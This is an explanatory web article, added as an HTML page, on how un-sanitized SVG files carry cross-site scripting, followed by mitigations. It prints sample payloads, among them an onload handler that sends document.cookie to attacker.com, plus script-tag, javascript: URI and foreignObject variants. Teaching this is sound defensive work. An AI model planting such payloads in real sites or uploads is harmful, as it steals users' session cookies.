@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R4Y4YXFHZS"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag(){
+            dataLayer.push(arguments);
+        }
+
+        gtag('js', new Date());
+
+        gtag('config', 'G-R4Y4YXFHZS');
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SVG XSS: How Malicious Scripts Execute in SVGs - svg</title>
+    <meta name="description" content="Scalable Vector Graphics (SVG) are widely used for web graphics, but because they are XML-based documents, they can natively embed and execute code such as JavaScript. This article explains how un-sanitized SVG files serve as delivery mechanisms for Cros">
+    <link rel="canonical" href="https://salivity.github.io/svg/article/svg-xss-how-malicious-scripts-execute-in-svgs">
+    <link rel="icon" href="/svg/favicon.ico">
+    <link rel="stylesheet" href="/svg/css/style.css">
+    <link media="print" rel="stylesheet" href="/svg/css/print.css">
+    <script src="/svg/js/fuse.min.js"></script>
+    <script src="/svg/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="SVG XSS: How Malicious Scripts Execute in SVGs - svg" />
+    <meta property="og:url" content="https://salivity.github.io/svg/article/svg-xss-how-malicious-scripts-execute-in-svgs" />
+    <meta property="og:image:url" content="https://salivity.github.io/svg/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/svg/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="Scalable Vector Graphics (SVG) are widely used for web graphics, but because they are XML-based documents, they can natively embed and execute code such as JavaScript. This article explains how un-sanitized SVG files serve as delivery mechanisms for Cros" />
+    <link rel="manifest" href="/svg/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/svg/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>svg</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="https://github.com/salivity" title="Github" aria-label="Go To Github Profile Page"><svg class="svg-icon" focusable="false" aria-hidden="true" viewBox="0 0 24 24"><path d="M12 1.27a11 11 0 00-3.48 21.46c.55.09.73-.28.73-.55v-1.84c-3.03.64-3.67-1.46-3.67-1.46-.55-1.29-1.28-1.65-1.28-1.65-.92-.65.1-.65.1-.65 1.1 0 1.73 1.1 1.73 1.1.92 1.65 2.57 1.2 3.21.92a2 2 0 01.64-1.47c-2.47-.27-5.04-1.19-5.04-5.5 0-1.1.46-2.1 1.2-2.84a3.76 3.76 0 010-2.93s.91-.28 3.11 1.1c1.8-.49 3.7-.49 5.5 0 2.1-1.38 3.02-1.1 3.02-1.1a3.76 3.76 0 010 2.93c.83.74 1.2 1.74 1.2 2.94 0 4.21-2.57 5.13-5.04 5.4.45.37.82.92.82 2.02v3.03c0 .27.1.64.73.55A11 11 0 0012 1.27"></path></svg></a></li>
+                <li><a href="/svg/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article><h1 id="svg-xss-how-malicious-scripts-execute-in-svgs">SVG XSS: How
+Malicious Scripts Execute in SVGs</h1>
+<p>Scalable Vector Graphics (SVG) are widely used for web graphics, but
+because they are XML-based documents, they can natively embed and
+execute code such as JavaScript. This article explains how un-sanitized
+SVG files serve as delivery mechanisms for Cross-Site Scripting (XSS)
+attacks, breaks down the primary injection vectors within the SVG
+syntax, details how browser rendering contexts affect execution, and
+outlines the essential methods for mitigating these security risks.</p>
+<h2 id="why-svg-files-are-vulnerable-to-xss">Why SVG Files Are
+Vulnerable to XSS</h2>
+<p>Unlike raster image formats like PNG, JPEG, or GIF, an SVG is an
+XML-based text document that describes two-dimensional vector graphics.
+Because modern browsers parse SVG files as standard Document Object
+Model (DOM) elements, SVGs support styling, animation, and interactivity
+through client-side scripts.</p>
+<p>When a web application allows users to upload or embed un-sanitized
+SVG files, an attacker can insert malicious JavaScript into the XML
+markup. If the application renders the file directly in the DOM or
+serves it without restrictive headers, the browser executes the embedded
+script within the context of the user's session, leading to Stored
+XSS.</p>
+<h2 id="common-payloads-and-execution-vectors">Common Payloads and
+Execution Vectors</h2>
+<p>Attackers exploit the structural elements and attributes of SVG files
+in several distinct ways:</p>
+<h3 id="1-direct-script-elements">1. Direct <code>&lt;script&gt;</code>
+Elements</h3>
+<p>Because SVG supports standard script tags, an attacker can embed
+JavaScript directly within the SVG body:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">svg</span> <span class="ot">xmlns=</span><span class="st">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">script</span> <span class="ot">type=</span><span class="st">&quot;text/javascript&quot;</span>&gt;</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    alert(document.domain);</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  &lt;/<span class="kw">script</span>&gt;</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">svg</span>&gt;</span></code></pre></div>
+<h3 id="2-inline-event-handlers">2. Inline Event Handlers</h3>
+<p>SVG elements support standard HTML and SVG-specific event handlers.
+Attackers can attach events such as <code>onload</code>,
+<code>onerror</code>, <code>onmouseover</code>, or <code>onclick</code>
+to various tags:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">svg</span> <span class="ot">xmlns=</span><span class="st">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="ot">onload=</span><span class="st">&quot;fetch(&#39;https://attacker.com/steal?cookie=&#39; + document.cookie)&quot;</span>&gt;</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">rect</span> <span class="ot">width=</span><span class="st">&quot;100&quot;</span> <span class="ot">height=</span><span class="st">&quot;100&quot;</span> <span class="ot">fill=</span><span class="st">&quot;blue&quot;</span> /&gt;</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">svg</span>&gt;</span></code></pre></div>
+<h3 id="3-hyperlinks-with-javascript-uris">3. Hyperlinks with
+<code>javascript:</code> URIs</h3>
+<p>The SVG specification allows linking elements using
+<code>&lt;a&gt;</code> tags with <code>xlink:href</code> or standard
+<code>href</code> attributes. Attackers can set the destination to a
+JavaScript pseudo-protocol:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">svg</span> <span class="ot">xmlns=</span><span class="st">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="ot">xmlns:xlink=</span><span class="st">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">a</span> <span class="ot">xlink:href=</span><span class="st">&quot;javascript:alert(1)&quot;</span>&gt;</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">text</span> <span class="ot">x=</span><span class="st">&quot;10&quot;</span> <span class="ot">y=</span><span class="st">&quot;20&quot;</span>&gt;Click here&lt;/<span class="kw">text</span>&gt;</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  &lt;/<span class="kw">a</span>&gt;</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">svg</span>&gt;</span></code></pre></div>
+<h3 id="4-the-foreignobject-element">4. The
+<code>&lt;foreignObject&gt;</code> Element</h3>
+<p>The <code>&lt;foreignObject&gt;</code> element allows arbitrary HTML
+markup to be embedded within an SVG. This enables attackers to inject
+standard HTML-based XSS payloads:</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">svg</span> <span class="ot">xmlns=</span><span class="st">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">foreignObject</span> <span class="ot">width=</span><span class="st">&quot;100%&quot;</span> <span class="ot">height=</span><span class="st">&quot;100%&quot;</span>&gt;</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">body</span> <span class="ot">xmlns=</span><span class="st">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>      &lt;<span class="kw">img</span> <span class="ot">src=</span><span class="st">&quot;invalid-image&quot;</span> <span class="ot">onerror=</span><span class="st">&quot;alert(1)&quot;</span> /&gt;</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">body</span>&gt;</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>  &lt;/<span class="kw">foreignObject</span>&gt;</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">svg</span>&gt;</span></code></pre></div>
+<h2 id="the-role-of-browser-context">The Role of Browser Context</h2>
+<p>The execution of JavaScript within an SVG depends heavily on how the
+browser renders the file:</p>
+<ul>
+<li><strong>Inline SVG
+(<code>&lt;svg&gt;...&lt;svg&gt;</code>):</strong> Embedded directly
+into the HTML page, scripts run immediately with full access to the
+hosting origin's DOM and cookies.</li>
+<li><strong>Direct Navigation or <code>&lt;iframe&gt;</code>:</strong>
+Navigating directly to an SVG file (e.g.,
+<code>https://example.com/uploads/image.svg</code>) opens it as a
+standalone document, allowing embedded scripts to run under the host
+domain.</li>
+<li><strong><code>&lt;img&gt;</code> Tag / CSS Backgrounds:</strong>
+When loaded via an <code>&lt;img src="image.svg"&gt;</code> tag or as a
+CSS <code>background-image</code>, modern browsers disable script
+execution and external resource loading for security reasons.</li>
+</ul>
+<h2 id="how-to-prevent-svg-based-xss">How to Prevent SVG-Based XSS</h2>
+<p>To safely handle SVG uploads and rendering, implement the following
+defenses:</p>
+<ul>
+<li><strong>Sanitize XML Content:</strong> Use a proven library such as
+DOMPurify to strip <code>&lt;script&gt;</code>,
+<code>&lt;foreignObject&gt;</code>, inline event handlers, and
+<code>javascript:</code> URIs before saving or rendering the SVG.</li>
+<li><strong>Serve with Restrictive Headers:</strong> Serve user-uploaded
+SVGs with the <code>Content-Disposition: attachment</code> header to
+force downloads instead of inline browser execution.</li>
+<li><strong>Implement a Strict Content Security Policy (CSP):</strong>
+Use headers such as
+<code>Content-Security-Policy: default-src 'none'; script-src 'none'</code>
+on the domain serving media files.</li>
+<li><strong>Isolate on a Separate Domain:</strong> Host user-uploaded
+media on an isolated domain (e.g., a CDN or dedicated static asset
+domain) to prevent malicious scripts from accessing session tokens or
+sensitive data on the main application domain.</li>
+<li><strong>Rasterize on Upload:</strong> If vector capability is not
+strictly necessary, convert uploaded SVG files to PNG or WebP formats on
+the server before storing and displaying them.</li>
+</ul></article>
+        <div id=comments-container></div>
+
+        <script>
+            const utterancesScript = document.createElement('script');
+            
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/svg'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/svg/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/svg/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
